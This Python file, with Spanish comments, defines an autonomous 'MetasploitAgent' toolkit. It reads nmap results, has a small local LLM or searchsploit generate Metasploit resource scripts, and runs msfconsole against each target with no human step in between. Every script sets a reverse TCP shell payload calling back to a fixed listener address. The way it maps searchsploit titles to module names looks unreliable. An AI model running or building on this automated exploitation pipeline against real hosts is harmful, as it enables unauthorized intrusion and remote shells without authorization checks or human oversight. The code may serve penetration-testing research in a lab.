import json
import os
import subprocess
import requests
from typing import Dict, List
from datetime import datetime

from agno.tools.toolkit import Toolkit
from agno.utils.log import logger

import logging
logger.setLevel(logging.DEBUG)


class MetasploitAgent(Toolkit):
    def __init__(self):
        super().__init__(name="MetasploitAgent")
        self.register(self.run)
        self.ollama_url = "http://ollama:11434/api/generate"
        self.model = "llama3.2:1b"
        self.results_dir = "/results"  # Directorio persistente

    def generate_exploit_llm(self, ip: str, port: str, service: str) -> str:
        """Genera un script de Metasploit usando el LLM."""
        prompt = f"""
        Genera un script de Metasploit (.rc) para explotar un servicio {service} en {ip}:{port}.
        Usa un exploit conocido de Metasploit. Incluye:
        - Selección del exploit
        - set RHOSTS {ip}
        - set RPORT {port}
        - set PAYLOAD generic/shell_reverse_tcp
        - set LHOST 172.18.0.3
        - set LPORT 4444
        - exploit
        Devuelve solo el script.
        """
        try:
            response = requests.post(self.ollama_url, json={"model": self.model, "prompt": prompt, "stream": False}, timeout=30)
            response.raise_for_status()
            script = response.json().get("response", "").strip()
            if "use " in script and "exploit" in script:
                return script
            logger.warning("[!] Script LLM inválido, intentando searchsploit")
            return None
        except Exception as e:
            logger.error(f"[!] Error con LLM: {e}")
            return None

    def generate_exploit_searchsploit(self, ip: str, port: str, service: str) -> str:
        """Busca un exploit con searchsploit y genera un script básico."""
        try:
            cmd = ["searchsploit", "-j", service, f"port {port}"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                exploits = json.loads(result.stdout).get("RESULTS_EXPLOIT", [])
                if exploits:
                    exploit = exploits[0]["Title"]  # Tomar el primero
                    logger.info(f"[+] Exploit encontrado: {exploit}")
                    return f"""
use exploit/{exploit.lower().replace(' ', '_')}
set RHOSTS {ip}
set RPORT {port}
set PAYLOAD generic/shell_reverse_tcp
set LHOST 172.18.0.3
set LPORT 4444
exploit
"""
            logger.warning("[!] No se encontraron exploits en searchsploit")
            return None
        except Exception as e:
            logger.error(f"[!] Error con searchsploit: {e}")
            return None

    def run(self, **kwargs) -> Dict[str, str]:
        json_file = kwargs.get('json_file', 'nmap_result.json')
        timeout = kwargs.get('timeout', 600)

        if not os.path.exists(self.results_dir):
            os.makedirs(self.results_dir)

        try:
            with open(json_file, 'r') as f:
                nmap_data = json.load(f)
        except FileNotFoundError:
            logger.error(f"[!] No se encontró {json_file}")
            return {"error": f"No se encontró {json_file}"}
        except json.JSONDecodeError:
            logger.error(f"[!] Error al decodificar {json_file}")
            return {"error": f"Error al decodificar {json_file}"}

        metasploit_targets: List[str] = nmap_data.get("metasploit", [])
        if not metasploit_targets:
            logger.warning("[!] No hay objetivos para Metasploit")
            return {"warning": "No hay objetivos para Metasploit"}

        results = {}
        for target in metasploit_targets:
            try:
                ip, port, service = target.split(" ", 2)
                logger.info(f"[+] Procesando {ip} puerto {port} ({service})...")

                # Intentar con LLM primero, luego searchsploit
                exploit_script = self.generate_exploit_llm(ip, port, service) or self.generate_exploit_searchsploit(ip, port, service)
                if not exploit_script:
                    results[target] = "Error: No se pudo generar exploit"
                    continue

                # Guardar script
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                script_path = f"{self.results_dir}/exploit_{ip}_{port}_{timestamp}.rc"
                with open(script_path, "w") as f:
                    f.write(exploit_script)
                logger.debug(f" [+] Script guardado: {script_path}")

                # Ejecutar Metasploit
                command = ["/usr/bin/msfconsole", "-q", "-r", script_path]
                logger.debug(f" [+] Command: {' '.join(command)}")
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate(timeout=timeout)

                logger.debug(f" [+] Return code: {process.returncode}")
                logger.debug(f" [+] Stdout: {stdout[:1000]}...")
                logger.debug(f" [+] Stderr: {stderr[:1000]}...")

                # Guardar salida
                output_path = f"{self.results_dir}/output_{ip}_{port}_{timestamp}.txt"
                with open(output_path, "w") as f:
                    f.write(stdout + "\n" + stderr)
                logger.info(f"[+] Salida guardada en {output_path}")

                if process.returncode == 0 and "Exploit completed" in stdout:
                    logger.info(f"[+] Exploit ejecutado con éxito en {target}")
                    results[target] = stdout
                else:
                    logger.error(f"[!] Error en {target}: {stderr or 'Sin detalles'}")
                    results[target] = f"Error: {stderr or 'Sin detalles'}"

            except Exception as e:
                logger.error(f"[!] Error en {target}: {e}")
                results[target] = f"Error: {e}"

        return results


if __name__ == "__main__":
    agent = MetasploitAgent()
    result = agent.run()
    print(json.dumps(result, indent=2))